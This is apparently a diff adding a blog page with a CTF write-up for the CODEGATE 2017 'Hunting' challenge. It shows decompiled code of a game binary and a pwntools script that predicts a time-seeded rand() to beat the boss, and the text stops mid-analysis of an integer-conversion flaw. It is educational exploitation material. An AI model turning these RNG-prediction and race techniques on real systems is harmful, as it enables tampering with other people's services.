@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>CODEGATE 2017 Prequalification - Hunting | kileak</title>
+
+
+
+
+
+<meta name="description" content="CODEGATE 2017 Prequalification - Hunting">
+
+
+<meta name="keywords" content="Codegate">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/Codegate-2017-Hunting/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">CODEGATE 2017 Prequalification - Hunting</h1>
+      <p class="post-meta">Feb 14, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Hunting Monster
+<!--break--></p>
+
+  <p>ssh hunting@110.10.212.133 -p5555 (pw : hunting)</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/hunting/hunting">hunting</a> <a href="https://kileak.github.io/assets/hunting/xpl.py">xpl.py</a></p>
+
+</blockquote>
+
+<p>The hunting binary turned out to be a little game, in which we had to kill a “boss”. For this we were provided with different skills, which we could use against him. On every attack, he does a counter-attack and we’re able to use a specific shield (ice, fire, wind). If our shield matches his attack, we won’t lose any hitpoints.</p>
+
+<p>Let’s have a look at the disassembled parts of the binary:</p>
+
+<p><strong>Main menu:</strong></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">  <span class="c1">// Initializing random generator with current time as seed  </span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
+  <span class="n">srand</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
+  
+  <span class="n">playerActionCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">2</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">playerActionCount</span> <span class="o">&gt;</span> <span class="mi">249</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Game Over"</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">byte_6033F0</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"What's your name?"</span><span class="p">);</span>
+      <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v9</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">showMenu</span><span class="p">();</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"choice:"</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
+      <span class="n">a2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">input</span><span class="p">;</span>
+      <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
+      <span class="k">switch</span> <span class="p">(</span> <span class="n">input</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+          <span class="n">showHelp</span><span class="p">();</span>
+          <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+          <span class="n">a2</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+          <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">newthread</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span><span class="n">start_routine</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+          <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
+          <span class="n">changeSkill</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">game</span><span class="p">);</span>
+          <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
+          <span class="n">removeSkill</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">game</span><span class="p">);</span>
+          <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
+          <span class="n">receiveSuggestion</span><span class="p">();</span>
+<span class="nl">LABEL_12:</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">input</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">defendFunc</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">game</span><span class="p">);</span>
+            <span class="n">sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="o">++</span><span class="n">playerActionCount</span><span class="p">;</span>
+          <span class="k">continue</span><span class="p">;</span>
+        <span class="nl">default:</span>
+          <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+          <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span></code></pre></figure>
+
+<p>Option 2 is for “Use skill”, which lets us attack the boss. It will start a new thread for calculating the player attack against the boss and then calls the “defend”-function (in the main thread), in which the attack from the boss is handled. After that, it will directly loop back into the menu.</p>
+
+<p>We should keep that in mind, since this makes it possible to trigger another option, while the attack thread is still running, if executed fast enough.</p>
+
+<p>First, we tried to just stay alive and kill the boss by just not dying. To be able to do this, we need to know what attack the boss will be doing next, before it is executed. So let’s have a look at the “defend” function:</p>
+
+<p><strong>Defend</strong></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">========================================Boss' Attack"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Boss is Attacking you!"</span><span class="p">);</span>
+  <span class="n">showShieldMenu</span><span class="p">();</span>		<span class="c1">// Just shows the option we can use</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"choice:"</span><span class="p">);</span>
+  <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">);</span>
+  <span class="c1">// Set the shield we're using to 1</span>
+  <span class="k">switch</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">13</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>		<span class="c1">// fire shield</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">14</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>		<span class="c1">// wind shield</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>		<span class="c1">// ice shield</span>
+      <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="c1">// Calculate the attack the boss will use</span>
+  <span class="n">bossAttackRand</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+  <span class="n">v8</span> <span class="o">=</span> <span class="n">bossAttackRand</span><span class="p">;</span>
+  <span class="n">bossAttack</span> <span class="o">=</span> <span class="p">((((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="n">bossAttackRand</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">bossAttackRand</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> 
+               <span class="o">-</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="n">bossAttackRand</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">);</span>
+  <span class="n">v9</span> <span class="o">=</span> <span class="n">bossAttack</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">bossAttack</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">14</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"You succeed in defense"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">;</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span> <span class="o">=</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">return250_2</span><span class="p">();</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span> <span class="n">bossAttack</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">13</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"You succeed in defense"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">;</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">-</span> <span class="n">return250</span><span class="p">();</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">bossAttack</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"You succeed in defense"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">;</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">-</span> <span class="n">return250_3</span><span class="p">();</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="n">resetShields</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
+  <span class="n">showPlayerHP</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"========================================"</span><span class="p">);</span></code></pre></figure>
+
+<p>So it basically just uses</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mi">3</span></code></pre></figure>
+
+<p>to calculate the attack, the boss will be using.</p>
+
+<p>Since the random generator was initialized with the current time as seed, we should easily be able to guess the attack every time and use the appropriate shield by initializing our own random generator with the same time (which is just current time at process start).</p>
+
+<p>We’ll have to bear in mind, that in the player attack thread also a rand() is used to calculate the damage the player is doing to the boss. So we’ll need to consume two rand()’s per round to stay in sync with the app rng.</p>
+
+<p>So we’ll start just casting iceball again and again, while defending perfectly against the boss attacks.</p>
+
+<p><strong>First try</strong></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwnlib.tubes</span> <span class="kn">import</span> <span class="n">process</span>
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">re</span>
+
+<span class="n">cdll</span><span class="p">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+
+<span class="n">playerLevel</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">playerHP</span> <span class="o">=</span> <span class="mi">500</span>
+<span class="n">bossHP</span> <span class="o">=</span> <span class="mi">100</span>
+<span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="c1"># Change curently used skill
+</span><span class="k">def</span> <span class="nf">changeskill</span><span class="p">(</span><span class="n">skill</span><span class="p">):</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">skill</span><span class="p">))</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># Get the matching shield countering the boss attack
+</span><span class="k">def</span> <span class="nf">getShieldToUse</span><span class="p">(</span><span class="n">attack</span><span class="p">):</span>
+	<span class="k">if</span> <span class="n">attack</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+		<span class="k">return</span> <span class="mi">3</span>
+	<span class="k">elif</span> <span class="n">attack</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+		<span class="k">return</span> <span class="mi">2</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">return</span> <span class="mi">1</span>
+
+<span class="c1"># just a helper to match current states
+</span><span class="k">def</span> <span class="nf">findValue</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">defValue</span><span class="p">):</span>
+	<span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">S</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+		<span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+
+	<span class="k">return</span> <span class="n">defValue</span>
+
+<span class="c1"># check for state changes in server responses
+</span><span class="k">def</span> <span class="nf">checkForStates</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+	<span class="k">global</span> <span class="n">playerLevel</span><span class="p">,</span> <span class="n">bossHP</span><span class="p">,</span> <span class="n">playerHP</span>
+
+	<span class="n">playerLevel</span> <span class="o">=</span> <span class="n">findValue</span><span class="p">(</span><span class="s">"level:(.?)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">playerLevel</span><span class="p">)</span>
+	<span class="n">bossHP</span> <span class="o">=</span> <span class="n">findValue</span><span class="p">(</span><span class="s">"Boss's hp is (.+?)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">bossHP</span><span class="p">)</span>
+	<span class="n">playerHP</span> <span class="o">=</span> <span class="n">findValue</span><span class="p">(</span><span class="s">"Your HP is (.+?)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">playerHP</span><span class="p">)</span>
+
+<span class="c1"># Call the "Use skill" option to attack the boss and defend against his attack
+</span><span class="k">def</span> <span class="nf">useskill</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">counter</span><span class="p">,</span> <span class="n">playerLevel</span><span class="p">,</span> <span class="n">playerHP</span><span class="p">,</span> <span class="n">bossHP</span>
+
+	<span class="c1"># print out some info
+</span>	<span class="k">print</span> <span class="p">(</span><span class="s">""</span><span class="p">)</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">"Start attack round"</span><span class="p">)</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">""</span><span class="p">)</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">" [+] Current level : %d"</span> <span class="o">%</span> <span class="n">playerLevel</span><span class="p">)</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">" [+] Player HP     : %d"</span> <span class="o">%</span> <span class="n">playerHP</span><span class="p">)</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">" [+] Boss HP       : %d"</span> <span class="o">%</span> <span class="n">bossHP</span><span class="p">)</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">""</span><span class="p">)</span>
+
+	<span class="c1"># Send "Use skill"
+</span>	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
+
+	<span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span>			<span class="c1"># consume rand for player attack in attack thread
+</span>	<span class="n">bossAttack</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mi">3</span>	<span class="c1"># rand for boss attack in defend function
+</span>
+	<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+	<span class="n">useShield</span> <span class="o">=</span> <span class="n">getShieldToUse</span><span class="p">(</span><span class="n">bossAttack</span><span class="p">)</span>
+
+	<span class="c1"># Send the shield we want to use to the server
+</span>	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">useShield</span><span class="p">))</span>
+
+	<span class="c1"># Receive responses and update player states
+</span>	<span class="n">checkForStates</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
+	<span class="n">checkForStates</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
+
+	<span class="c1"># Select iceball 
+</span>	<span class="n">changeskill</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+	<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+		<span class="c1"># Keep attacking
+</span>		<span class="n">useskill</span><span class="p">()</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">"./hunting"</span><span class="p">)</span>
+
+<span class="c1"># Initialize rng with current time
+</span><span class="n">libc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="bp">None</span><span class="p">))</span>
+
+<span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>Ok, that made us invincible for now, so it wasn’t a problem anymore to kill the boss without losing any health:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xplshield.py 
+[+] Started program './hunting'
+
+Start attack round
+
+ [+] Current level : 1
+ [+] Player HP     : 500
+ [+] Boss HP       : 100
+
+Start attack round
+
+ [+] Current level : 2
+ [+] Player HP     : 500
+ [+] Boss HP       : -502
+
+[SNIP]
+
+Start attack round
+
+ [+] Current level : 3
+ [+] Player HP     : 500
+ [+] Boss HP       : 580
+
+Start attack round
+
+ [+] Current level : 4
+ [+] Player HP     : 500
+ [+] Boss HP       : -136
+
+Start attack round
+
+ [+] Current level : 4
+ [+] Player HP     : 500
+ [+] Boss HP       : 9223372036854775033
+
+Start attack round
+
+ [+] Current level : 4
+ [+] Player HP     : 500
+ [+] Boss HP       : 9223372036854774952</code></pre></figure>
+
+<p>But at level 4, the boss hp jumped up just a “little bit”. Since our damage value is calculated in 32bit, it would’ve taken forever to kill the boss this way.</p>
+
+<p>So we need another approach to kill the boss faster. Let’s check how the player damage is calculated:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">========================================Skill Activation"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">You use %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="n">strcmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">32</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">aAttack</span><span class="p">[</span><span class="mi">32</span> <span class="o">*</span> <span class="n">i</span><span class="p">]);</span> <span class="o">++</span><span class="n">i</span> <span class="p">);</span>
+  
+  <span class="n">executePlayerAttack</span><span class="p">(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>
+  
+  <span class="k">if</span> <span class="p">(</span> <span class="n">useSkillLockObject</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"You are already using the skill. Skill failed to use:%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">useSkillLockObject</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">4</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="c1">// Check that the damage value isn't negative</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">72</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0LL</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Damage can't be negative number!"</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="c1">// Subtract the rand()-value from boss hp (converts the 32bit dmg to 64bit signed with cdqe before)</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24</span><span class="p">)</span> <span class="o">-=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">72</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Boss's hp is %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24</span><span class="p">));</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">// Check that the damage value isn't negative    </span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">72</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0LL</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Damage can't be negative number!"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="c1">// Subtract the rand() value from boss hp       </span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24</span><span class="p">)</span> <span class="o">-=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">72</span><span class="p">);</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Boss's hp is %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="n">checkBossDeath</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">game</span><span class="p">);</span>
+    <span class="n">useSkillLockObject</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
